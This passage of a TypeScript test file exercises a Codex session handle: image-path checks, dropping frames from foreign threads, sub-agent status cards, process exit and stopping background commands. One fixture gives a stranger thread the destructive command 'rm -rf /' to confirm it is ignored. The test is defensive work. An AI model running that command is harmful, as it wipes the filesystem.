      command: 'echo one',
      cwd: '/tmp/x',
    })
    transport.serverRequest(107, 'item/tool/requestUserInput', question())
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))

    await handle.close()
    await consumer

    expect(statuses(events, before)[0]).toBe('waiting_permission')
    expect(statuses(events, before), 'nothing said the session went back to work').not.toContain(
      'working',
    )
    expect(statuses(events, before).at(-1)).toBe('ended')
    expect(transport.responses.filter((r) => r.id === 106 || r.id === 107)).toHaveLength(2)
  })
})

describe('CodexRuntime — the image path is CHECKED, not believed (067)', () => {
  let home: string
  let images: string

  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), 'brobot-067-rt-'))
    images = join(home, 'generated_images', 'th_1')
    mkdirSync(images, { recursive: true })
  })

  afterEach(() => rmSync(home, { recursive: true, force: true }))

  async function startIn(providerHome: string): Promise<{
    transport: FakeTransport
    handle: Awaited<ReturnType<CodexRuntime['start']>>
    events: RuntimeEvent[]
    consumer: Promise<void>
  }> {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.send('draw a fox')
    return { transport, handle, events, consumer }
  }

  const imageItem = (savedPath?: string): Record<string, unknown> => ({
    type: 'imageGeneration',
    id: 'exec-1',
    status: 'completed',
    revisedPrompt: 'a curled-up red fox',
    result: 'A'.repeat(200_000),
    ...(savedPath ? { savedPath } : {}),
  })

  it('substitutes the REAL path when the provider named a file inside its own home', async () => {
    const file = join(images, 'exec-1.png')
    writeFileSync(file, Buffer.from([0x89, 0x50, 0x4e, 0x47]))
    const { transport, handle, events, consumer } = await startIn(home)
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: imageItem(file),
    })
    await vi.waitFor(has(events, (e) => e.type === 'image'))
    const image = firstOfType(events, 'image')
    expect(image.path).toContain('exec-1.png')
    expect(image.prompt).toBe('a curled-up red fox')
    expect(JSON.stringify(events)).not.toContain('AAAA')
    await handle.close()
    await consumer
  })

  it('finds the file by convention when the provider named no path at all', async () => {
    writeFileSync(join(images, 'exec-1.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]))
    const { transport, handle, events, consumer } = await startIn(home)
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: imageItem(),
    })
    await vi.waitFor(has(events, (e) => e.type === 'image'))
    expect(firstOfType(events, 'image').path).toContain('exec-1.png')
    await handle.close()
    await consumer
  })

  it('🔴 726 · R92 — KEEPS a real image the provider named outside its home', async () => {
    const elsewhere = mkdtempSync(join(tmpdir(), 'brobot-067-out-'))
    try {
      const escape = join(elsewhere, 'exec-1.png')
      writeFileSync(escape, Buffer.from([0x89, 0x50, 0x4e, 0x47]))
      const { transport, handle, events, consumer } = await startIn(home)
      transport.notification('item/completed', {
        threadId: 'th_1',
        turnId: 'tn_1',
        item: imageItem(escape),
      })
      await vi.waitFor(has(events, (e) => e.type === 'image'))
      const image = firstOfType(events, 'image')
      expect(image.path).toBe(realpathSync.native(escape))
      expect(image.imageId).toBe('exec-1')
      await handle.close()
      await consumer
    } finally {
      rmSync(elsewhere, { recursive: true, force: true })
    }
  })

  it('emits an image with no path when the file simply is not there', async () => {
    const { transport, handle, events, consumer } = await startIn(home)
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: imageItem(join(images, 'exec-1.png')),
    })
    await vi.waitFor(has(events, (e) => e.type === 'image'))
    expect(firstOfType(events, 'image').path).toBeUndefined()
    await handle.close()
    await consumer
  })
})

describe('the instruction files Codex reports (158)', () => {
  const sources = ['/homes/codex/AGENTS.md', '/work/AGENTS.md', '/work/repo/AGENTS.md']

  it('⛔ start: the reported sources are retained, in the provider’s own order', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...threadStartResponse('th_1'),
      instructionSources: sources,
    }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })

    expect(handle.instructionSources).toEqual(sources)
    await handle.close()
  })

  it('⛔ resume: a fresh read REPLACES the old list, never merges with it', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => ({
      ...threadStartResponse('th_1'),
      instructionSources: ['/homes/codex/AGENTS.md'],
    }))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home' },
    )

    expect(handle.instructionSources).toEqual(['/homes/codex/AGENTS.md'])
    await handle.close()
  })

  it('⚠️ an EMPTY list reads as nothing reported — not as an empty section', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })

    expect(handle.instructionSources).toBeUndefined()
    await handle.close()
  })

  it('🔒 non-string entries are dropped — wire data reaching a surface is filtered', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...threadStartResponse('th_1'),
      instructionSources: ['/work/AGENTS.md', 42, null, { path: '/evil' }, ''],
    }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })

    expect(handle.instructionSources).toEqual(['/work/AGENTS.md'])
    await handle.close()
  })
})

describe('CodexSessionHandle — thread scope, by what the frame carries (200)', () => {
  const OTHER = 'th_SOMEBODY_ELSE'
  const PROMPTING = {
    approvalsReviewer: 'user',
    approvalPolicy: 'on-request',
    sandboxPolicy: { type: 'workspaceWrite' },
  }
  const diffOf = (path: string, line: string): string =>
    [
      `diff --git a/${path} b/${path}`,
      'index 0000000..1111111 100644',
      `--- a/${path}`,
      `+++ b/${path}`,
      '@@ -0,0 +1 @@',
      `+${line}`,
    ].join('\n')

  const scope = (handle: unknown): { seen: number; dropped: number } =>
    (handle as CodexSessionHandle).frameScope

  async function barrier(
    transport: FakeTransport,
    events: RuntimeEvent[],
    tag: string,
  ): Promise<void> {
    transport.notification(`marker/${tag}`, {})
    await vi.waitFor(has(events, (e) => e.type === 'unknown' && e.label === `marker/${tag}`))
  }

  it('⛔ a frame naming a FOREIGN thread is dropped — for all four methods 192 named', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('error', {
      threadId: OTHER,
      turnId,
      error: { message: 'somebody else exploded', codexErrorInfo: 'unauthorized' },
    })
    transport.notification('turn/diff/updated', {
      threadId: OTHER,
      turnId,
      diff: diffOf('their/secret.ts', 'not ours'),
    })
    transport.notification('thread/settings/updated', {
      threadId: OTHER,
      threadSettings: { ...PROMPTING, approvalPolicy: 'never', model: 'foreign-model' },
    })
    transport.notification('model/rerouted', {
      threadId: OTHER,
      turnId,
      fromModel: 'gpt-5',
      toModel: 'foreign-model',
      reason: 'highRiskCyberActivity',
    })
    await barrier(transport, events, 'foreign')

    expect(events.filter((e) => e.type === 'error')).toEqual([])
    expect(events.filter((e) => e.type === 'file_change')).toEqual([])
    expect((handle as CodexSessionHandle).agentInfo?.model).not.toBe('foreign-model')
    expect(['ended', 'errored']).not.toContain(handle.status())
    expect(transport.closeCount).toBe(0)
    expect(scope(handle).dropped).toBe(4)

    await handle.close()
    await consumer
  })

  it('⚠️ …and the SAME four naming THIS thread all arrive — the paired positive', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('error', {
      threadId: 'th_1',
      turnId,
      error: { message: 'ours exploded' },
    })
    transport.notification('turn/diff/updated', {
      threadId: 'th_1',
      turnId,
      diff: diffOf('ours.ts', 'ours'),
    })
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: { ...PROMPTING, model: 'ours-model' },
    })
    transport.notification('model/rerouted', {
      threadId: 'th_1',
      turnId,
      fromModel: 'gpt-5',
      toModel: 'rerouted-model',
      reason: 'highRiskCyberActivity',
    })
    await barrier(transport, events, 'ours')

    const messages = events.flatMap((e) => (e.type === 'error' ? [e.message] : []))
    expect(messages.some((m) => m.includes('ours exploded'))).toBe(true)
    expect(messages.some((m) => m.includes('rerouted-model'))).toBe(true)
    expect(firstOfType(events, 'file_change').changes.map((c) => c.path)).toEqual(['ours.ts'])
    expect((handle as CodexSessionHandle).agentInfo?.model).toBe('rerouted-model')
    expect(scope(handle).dropped).toBe(0)

    await handle.close()
    await consumer
  })

  it('⛔ the sub-agent ending SURVIVES the gate — the frame whose threadId is its subject', async () => {
    const ALPHA = 'th_alpha_child'
    const GRANDCHILD = 'th_grandchild'
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    const birth = {
      item: {
        type: 'subAgentActivity',
        id: 'call_alpha',
        kind: 'started',
        agentThreadId: ALPHA,
        agentPath: 'alpha',
      },
      threadId: 'th_1',
      turnId,
    }
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    transport.notification('item/started', birth)
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('thread/status/changed', {
      threadId: GRANDCHILD,
      status: { type: 'active' },
    })
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    await barrier(transport, events, 'children')

    const cards = events.flatMap((e) => (e.type === 'sub_agent' ? [`${e.agentId}:${e.phase}`] : []))
    expect(cards).toEqual([
      `${ALPHA}:started`,
      `${ALPHA}:progress`,
      `${GRANDCHILD}:started`,
      `${ALPHA}:ended`,
    ])
    expect(scope(handle).dropped).toBe(0)

    await handle.close()
    await consumer
  })

  it('⛔ an OUT-OF-TURN credential error is still delivered — the assertion that stops the next widening', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    expect(handle.status()).not.toBe('working')
    transport.notification('error', {
      threadId: 'th_1',
      turnId: 'tn_none',
      error: { message: 'Unauthorized: your sign-in has expired', codexErrorInfo: 'unauthorized' },
    })
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.cause === 'auth'))
    expect(firstOfType(events, 'error').message).toContain('sign-in has expired')

    await handle.close()
    await consumer
  })

  it('⛔ a STALE `turn/diff/updated` cannot overwrite the running turn — and the live one still wins', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('one')
    transport.notification('turn/diff/updated', {
      threadId: 'th_1',
      turnId: 'tn_1',
      diff: diffOf('one.ts', 'from turn one'),
    })
    await vi.waitFor(has(events, (e) => e.type === 'file_change'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))

    await handle.send('two')
    transport.notification('turn/diff/updated', {
      threadId: 'th_1',
      turnId: 'tn_1',
      diff: diffOf('one.ts', 'from turn one, restated late'),
    })
    await barrier(transport, events, 'stale-diff')
    expect(events.filter((e) => e.type === 'file_change')).toHaveLength(1)

    transport.notification('turn/diff/updated', {
      threadId: 'th_1',
      turnId: 'tn_2',
      diff: diffOf('two.ts', 'from turn two'),
    })
    await vi.waitFor(
      has(events, (e) => e.type === 'file_change' && e.changes[0]?.path === 'two.ts'),
    )

    await handle.close()
    await consumer
  })

  it('⛔ `account/rateLimits/updated` still arrives — its type carries NO ids at all', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.notification('account/rateLimits/updated', {
      rateLimits: {
        limitId: 'codex',
        primary: { usedPercent: 96, windowDurationMins: 300, resetsAt: 4_000_000_000 },
        secondary: null,
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.message.includes('96%')))
    expect(scope(handle).dropped).toBe(0)

    await handle.close()
    await consumer
  })

  it('⚑ the counter reads what the gate refused AGAINST what the transport delivered (§3)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const before = scope(handle).seen
    expect(before).toBe(0)
    transport.notification('error', { threadId: OTHER, error: { message: 'theirs' } })
    transport.notification('error', { threadId: OTHER, error: { message: 'theirs again' } })
    transport.notification('turn/diff/updated', {
      threadId: OTHER,
      turnId: 'tn_1',
      diff: diffOf('theirs.ts', 'x'),
    })
    await barrier(transport, events, 'counted')

    const after = (handle as CodexSessionHandle).frameScope
    expect(after.dropped).toBe(3)
    expect(after.seen).toBe(before + 4)
    expect(after.byMethod).toEqual({ error: 2, 'turn/diff/updated': 1 })

    await handle.close()
    await consumer
  })

  it('🔒 the counter is BOUNDED — its key comes off the wire (052)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    for (let i = 0; i < 50; i++) {
      transport.notification(`invented/method${i}`, { threadId: OTHER })
    }
    await barrier(transport, events, 'bounded')

    const after = (handle as CodexSessionHandle).frameScope
    expect(after.dropped, 'every drop is still counted').toBe(50)
    expect(Object.keys(after.byMethod).length, 'but not every one is named').toBeLessThanOrEqual(33)
    expect(after.byMethod['(other)']).toBe(50 - 32)

    await handle.close()
    await consumer
  })
})

describe('CodexSessionHandle — a child reports on itself (226)', () => {
  const OURS = 'th_1'
  const ALPHA = 'th_alpha'
  const GAMMA = 'th_gamma'
  const STRANGER = 'th_stranger'

  const scope = (handle: unknown): { seen: number; dropped: number; adopted: number } =>
    (handle as CodexSessionHandle).frameScope

  const birthOn = (
    threadId: string,
    agentThreadId: string,
    agentPath: string,
    turnId = 'tn_child',
  ): unknown => ({
    item: {
      type: 'subAgentActivity',
      id: `call_${agentThreadId}`,
      kind: 'started',
      agentThreadId,
      agentPath,
    },
    threadId,
    turnId,
  })

  const usageOn = (threadId: string, totalTokens: number): unknown => ({
    threadId,
    turnId: 'tn_child',
    tokenUsage: {
      total: { totalTokens, inputTokens: totalTokens, outputTokens: 0 },
      last: { totalTokens: totalTokens * 10, inputTokens: 0, outputTokens: 0 },
      modelContextWindow: 258_400,
    },
  })

  const completedOn = (
    threadId: string,
    status: string,
    durationMs: number | null,
    turnId = 'tn_child',
  ): unknown => ({
    threadId,
    turn: { id: turnId, items: [], itemsView: 'summary', status, error: null, durationMs },
  })

  const startedOn = (threadId: string, turnId: string): unknown => ({
    threadId,
    turn: {
      id: turnId,
      items: [],
      itemsView: 'notLoaded',
      status: 'inProgress',
      error: null,
      durationMs: null,
    },
  })

  async function barrier(
    transport: FakeTransport,
    events: RuntimeEvent[],
    tag: string,
  ): Promise<void> {
    transport.notification(`marker/${tag}`, {})
    await vi.waitFor(has(events, (e) => e.type === 'unknown' && e.label === `marker/${tag}`))
  }

  const subAgents = (events: RuntimeEvent[]): Extract<RuntimeEvent, { type: 'sub_agent' }>[] =>
    events.filter((e): e is Extract<RuntimeEvent, { type: 'sub_agent' }> => e.type === 'sub_agent')

  it('⛔ the GRANDCHILD is announced, named and parented — 225 finding 1, at its cause', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('thread/status/changed', { threadId: GAMMA, status: { type: 'idle' } })
    transport.notification('item/started', birthOn(ALPHA, GAMMA, '/root/alpha/gamma'))
    transport.notification('item/completed', birthOn(ALPHA, GAMMA, '/root/alpha/gamma'))
    transport.notification('thread/status/changed', { threadId: GAMMA, status: { type: 'active' } })
    await barrier(transport, events, 'grandchild')

    const gamma = subAgents(events).filter((e) => e.agentId === GAMMA)
    expect(gamma.map((e) => e.phase)).toEqual(['started', 'progress'])
    expect(gamma[0]?.kind, 'the name the model coined, lineage and all').toBe('alpha/gamma')
    expect(gamma[0]?.parentToolCallId, 'the call that dispatched it').toBe(`call_${GAMMA}`)
    expect(gamma[0]?.idKind).toBe('thread')
    expect(gamma[0]?.origin).toBeUndefined()
    expect(
      subAgents(events).filter((e) => e.agentId === GAMMA && e.phase === 'started'),
    ).toHaveLength(1)
    expect(scope(handle).dropped, "the child's frames are still not our content").toBe(2)
    expect(scope(handle).adopted, 'the repeat announced nothing').toBe(1)

    await handle.close()
    await consumer
  })

  it('⛔ the outcome and the usage reach the card — and the idle that precedes them still ends it', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('thread/tokenUsage/updated', usageOn(ALPHA, 34_483))
    transport.notification('thread/tokenUsage/updated', { threadId: ALPHA, tokenUsage: {} })
    transport.notification('item/started', {
      threadId: ALPHA,
      turnId: 'tn_child',
      item: { type: 'commandExecution', id: 'exec-1', command: 'uname -s', status: 'inProgress' },
    })
    transport.notification('item/completed', {
      threadId: ALPHA,
      turnId: 'tn_child',
      item: { type: 'commandExecution', id: 'exec-1', command: 'uname -s', status: 'completed' },
    })
    transport.notification('item/started', {
      threadId: ALPHA,
      turnId: 'tn_child',
      item: { type: 'commandExecution', id: 'exec-2', command: 'sleep 60', status: 'inProgress' },
    })
    transport.notification('item/completed', {
      threadId: ALPHA,
      turnId: 'tn_child',
      item: { type: 'fileChange', id: 'patch-1', status: 'completed' },
    })
    transport.notification('item/started', {
      threadId: ALPHA,
      turnId: 'tn_child',
      item: { type: 'webSearch', id: 'search-1', query: 'anything', status: 'inProgress' },
    })
    transport.notification('thread/tokenUsage/updated', {
      threadId: ALPHA,
      tokenUsage: { total: { totalTokens: -1 }, last: { totalTokens: -1 } },
    })
    transport.notification('mcpServer/startupStatus/updated', {
      threadId: ALPHA,
      name: 'codex_apps',
      status: 'ready',
      error: null,
      failureReason: null,
    })
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    transport.notification('thread/tokenUsage/updated', usageOn(ALPHA, 999_999))
    transport.notification('turn/completed', completedOn(ALPHA, 'completed', 7610))
    await barrier(transport, events, 'ended')

    const alpha = subAgents(events).filter((e) => e.agentId === ALPHA)
    expect(alpha.map((e) => e.phase)).toEqual([
      'started',
      'progress',
      'progress',
      'progress',
      'progress',
      'ended',
      'ended',
    ])
    expect(alpha.find((e) => e.usage?.tokens)?.usage?.tokens).toBe(34_483)
    const tokenReadings = alpha.filter((e) => e.usage?.tokens !== undefined)
    expect(tokenReadings.map((e) => e.usage?.tokens)).toEqual([34_483])
    const counted = alpha.filter((e) => e.usage?.toolCalls !== undefined)
    expect(counted.map((e) => e.usage?.toolCalls)).toEqual([1, 2])
    const last = alpha.at(-1)
    expect(last?.phase).toBe('ended')
    expect(last?.outcome).toBe('completed')
    expect(last?.usage?.ms).toBe(7610)
    expect(scope(handle).adopted).toBe(4)
    expect(scope(handle).dropped).toBe(11)

    transport.notification('turn/completed', completedOn(ALPHA, 'completed', 7610))
    await barrier(transport, events, 'repeat')
    expect(subAgents(events).filter((e) => e.agentId === ALPHA && e.outcome)).toHaveLength(1)
    expect(scope(handle).adopted, 'a repeat is read and not counted').toBe(4)

    await handle.close()
    await consumer
  })

  it('⛔ a REPEATED `active` after an ending says nothing (transitions, not states)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('turn/started', startedOn(ALPHA, 'tn_one'))
    transport.notification('turn/completed', completedOn(ALPHA, 'completed', 1000, 'tn_one'))
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    await barrier(transport, events, 'repeat-active')

    expect(subAgents(events).map((e) => `${e.phase}:${e.outcome ?? '-'}`)).toEqual([
      'started:-',
      'progress:-',
      'ended:completed',
    ])

    await handle.close()
    await consumer
  })

  it('⛔ a child that runs a SECOND turn reports how THAT one went', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('turn/started', startedOn(ALPHA, 'tn_one'))
    transport.notification('turn/completed', completedOn(ALPHA, 'completed', 1000, 'tn_one'))
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification('turn/started', startedOn(ALPHA, 'tn_two'))
    transport.notification('turn/completed', completedOn(ALPHA, 'interrupted', 99_999, 'tn_one'))
    transport.notification('turn/completed', completedOn(ALPHA, 'failed', 2000, 'tn_two'))
    await barrier(transport, events, 'second-turn')

    const ended = subAgents(events).filter((e) => e.agentId === ALPHA && e.outcome)
    expect(ended.map((e) => e.outcome)).toEqual(['completed', 'failed'])
    expect(ended.map((e) => e.usage?.ms)).toEqual([1000, 3000])

    await handle.close()
    await consumer
  })

  it('⛔ a child that FAILED says so, and `inProgress` fails closed (055, inherited)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const BETA = 'th_beta'
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('item/started', birthOn(OURS, BETA, '/root/beta', transport.lastTurnId))
    transport.notification(
      'item/started',
      birthOn(OURS, GAMMA, '/root/gamma', transport.lastTurnId),
    )
    transport.notification('turn/completed', completedOn(ALPHA, 'failed', null))
    transport.notification('turn/completed', completedOn(BETA, 'inProgress', null))
    transport.notification('turn/completed', completedOn(GAMMA, 'interrupted', 42))
    await barrier(transport, events, 'failed')

    expect(subAgents(events).find((e) => e.agentId === ALPHA && e.outcome)?.outcome).toBe('failed')
    expect(subAgents(events).find((e) => e.agentId === BETA && e.outcome)?.outcome).toBe('failed')
    const stopped = subAgents(events).find((e) => e.agentId === GAMMA && e.outcome)
    expect(stopped?.outcome).toBe('interrupted')
    expect(stopped?.usage?.ms).toBe(42)
    expect(subAgents(events).find((e) => e.agentId === ALPHA && e.outcome)?.usage).toBeUndefined()
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'idle' } })
    await barrier(transport, events, 'after-failed')
    expect(
      subAgents(events)
        .filter((e) => e.agentId === ALPHA)
        .map((e) => e.phase),
    ).toEqual(['started', 'ended'])

    await handle.close()
    await consumer
  })

  it('🔒 a thread that is NOT one of ours reports NOTHING — the door is membership, not method', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const before = events.length
    transport.notification('thread/status/changed', {
      threadId: STRANGER,
      status: { type: 'active' },
    })
    transport.notification('item/started', birthOn(STRANGER, 'th_theirs', '/root/theirs'))
    transport.notification('item/completed', {
      threadId: STRANGER,
      item: { type: 'commandExecution', id: 'exec-x', command: 'rm -rf /', status: 'completed' },
    })
    transport.notification('thread/tokenUsage/updated', usageOn(STRANGER, 99_999))
    transport.notification('turn/completed', completedOn(STRANGER, 'completed', 1))
    await barrier(transport, events, 'stranger')

    const theirs = subAgents(events.slice(before))
    expect(theirs.map((e) => `${e.agentId}:${e.phase}:${e.origin ?? '-'}`)).toEqual([
      `${STRANGER}:started:observed`,
    ])
    expect(theirs[0]?.usage).toBeUndefined()
    expect(theirs[0]?.outcome).toBeUndefined()
    expect(scope(handle).adopted, 'nothing an unannounced thread said was read').toBe(0)
    expect(scope(handle).dropped).toBe(4)

    await handle.close()
    await consumer
  })

  it('🔒 a birth may not name OUR OWN thread, or the thread announcing it', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    await barrier(transport, events, 'self-setup')
    const before = events.length
    transport.notification('item/started', birthOn(ALPHA, OURS, '/root/alpha/ourselves'))
    transport.notification('item/started', birthOn(ALPHA, ALPHA, '/root/alpha/itself'))
    await barrier(transport, events, 'self')

    expect(
      subAgents(events.slice(before)),
      'no card for ourselves, and none for the announcer',
    ).toEqual([])
    transport.notification('item/started', birthOn(ALPHA, GAMMA, '/root/alpha/gamma'))
    await barrier(transport, events, 'self-positive')
    expect(subAgents(events).filter((e) => e.agentId === GAMMA)).toHaveLength(1)

    await handle.close()
    await consumer
  })

  it('⛔ a card the PARENT turn closed hears nothing more (075)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('thread/status/changed', { threadId: ALPHA, status: { type: 'active' } })
    transport.notification(
      'turn/completed',
      completedOn(OURS, 'interrupted', 10, transport.lastTurnId),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    const before = events.length
    transport.notification('thread/tokenUsage/updated', usageOn(ALPHA, 12_345))
    transport.notification('turn/completed', completedOn(ALPHA, 'completed', 500))
    transport.notification('item/completed', {
      threadId: ALPHA,
      item: { type: 'commandExecution', id: 'exec-late', command: 'ls', status: 'completed' },
    })
    await barrier(transport, events, 'sealed')

    expect(subAgents(events.slice(before)), 'the card was closed with the turn').toEqual([])
    expect(
      subAgents(events).filter((e) => e.agentId === ALPHA && e.phase === 'ended'),
    ).toHaveLength(1)

    await handle.close()
    await consumer
  })

  it("🔒 a child's WORDS stay out of the parent's transcript (128)", async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      birthOn(OURS, ALPHA, '/root/alpha', transport.lastTurnId),
    )
    transport.notification('item/agentMessage/delta', {
      threadId: ALPHA,
      turnId: 'tn_child',
      itemId: 'msg_child',
      delta: 'I am the child speaking',
    })
    transport.notification('item/completed', {
      threadId: ALPHA,
      turnId: 'tn_child',
      item: { type: 'agentMessage', id: 'msg_child', text: 'Darwin', phase: 'final_answer' },
    })

    transport.notification('item/completed', {
      threadId: OURS,
      turnId: transport.lastTurnId,
      item: {
        type: 'agentMessage',
        id: 'msg_ours',
        text: 'PARENT SPEAKING',
        phase: 'final_answer',
      },
    })
    await barrier(transport, events, 'quiet')

    const text = events
      .map((e) =>
        e.type === 'assistant_message' ? e.text : e.type === 'assistant_delta' ? e.text : '',
      )
      .join('')
    expect(text, 'the instrument can see a message at all').toContain('PARENT SPEAKING')
    expect(text).not.toContain('child speaking')
    expect(text).not.toContain('Darwin')
    expect(scope(handle).dropped, "the child's two frames were refused as content").toBe(2)
    expect(subAgents(events).some((e) => e.usage?.toolCalls !== undefined)).toBe(false)

    await handle.close()
    await consumer
  })
})

describe('233 · CodexSessionHandle.awaitProcessExit', () => {
  it('⛔ is the transport process, not a settled promise', async () => {
    const transport = new FakeTransport()
    const die = transport.ownsAProcess()
    transport.onRequest('thread/start', () => okThread('th_exit'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })

    const fact = handle.awaitProcessExit?.()
    expect(fact, 'a transport that owns a process must publish its exit').toBeDefined()
    expect(fact).toBe(transport.exited)

    let exited = false
    void (fact as Promise<void>).then(() => (exited = true))
    await new Promise((resolve) => setTimeout(resolve, 20))
    expect(exited, 'a live app-server must not be reported as an exit').toBe(false)

    die()
    await fact
    expect(exited).toBe(true)
    await handle.close()
  })

  it('⚑ …and says "cannot say" for a transport that owns no process', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_none'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })

    expect(handle.awaitProcessExit?.()).toBeUndefined()
    await handle.close()
  })
})

describe('CodexSessionHandle — stopping one live command (275)', () => {
  const ROW = {
    itemId: 'exec-62bc2acf-84b1-41a0-8d14-505c4014166e',
    processId: '42852',
    command: 'sleep 402.278',
    cwd: '/tmp/x',
    osPid: null,
    cpuPercent: null,
    rssKb: null,
  }

  it('⛔ OFFERS the method at all — which is the whole of `canStopBackgroundWork` for Codex', async () => {
    const { handle, consumer } = await startCodex()
    expect(typeof handle.stopBackgroundWork).toBe('function')
    expect(handle.backgroundWork).toBeUndefined()
    await handle.close()
    await consumer
  })

  it('sends `thread/backgroundTerminals/terminate` with the processId the card carries', async () => {
    const { transport, handle, consumer } = await startCodex()
    transport.onRequest('thread/backgroundTerminals/terminate', () => ({ terminated: true }))
    transport.onRequest('thread/backgroundTerminals/list', () => ({ data: [], nextCursor: null }))
    await handle.stopBackgroundWork?.('42852')
    expect(
      transport.requests.find((r) => r.method === 'thread/backgroundTerminals/terminate'),
    ).toEqual({
      method: 'thread/backgroundTerminals/terminate',
      params: { threadId: 'th_1', processId: '42852' },
    })
    await handle.close()
    await consumer
  })

  it('⛔ passes a provider refusal through — the measured -32600, not a swallowed no-op', async () => {
    const { transport, handle, consumer } = await startCodex()
    transport.failRequest('thread/backgroundTerminals/terminate')
    await expect(handle.stopBackgroundWork?.('not-an-integer')).rejects.toThrow(/failed/)
    await handle.close()
    await consumer
  })

  it('answers `false` once the session is over — no throw, and no claim that a stop was sent', async () => {
    const { transport, handle, consumer } = await startCodex()
    await handle.close()
    await consumer
    const before = transport.requests.length
    await expect(handle.stopBackgroundWork?.('42852')).resolves.toBe(false)
    expect(transport.requests.length).toBe(before)
  })

  it('⛔ publishes the level when a turn ends — the instant the app is about to say idle (250)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.onRequest('thread/backgroundTerminals/list', () => ({
      data: [ROW],
      nextCursor: null,
    }))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() =>
      expect(events.some((e) => e.type === 'background_work' && (e.running?.length ?? 0) > 0)).toBe(
        true,
      ),
    )
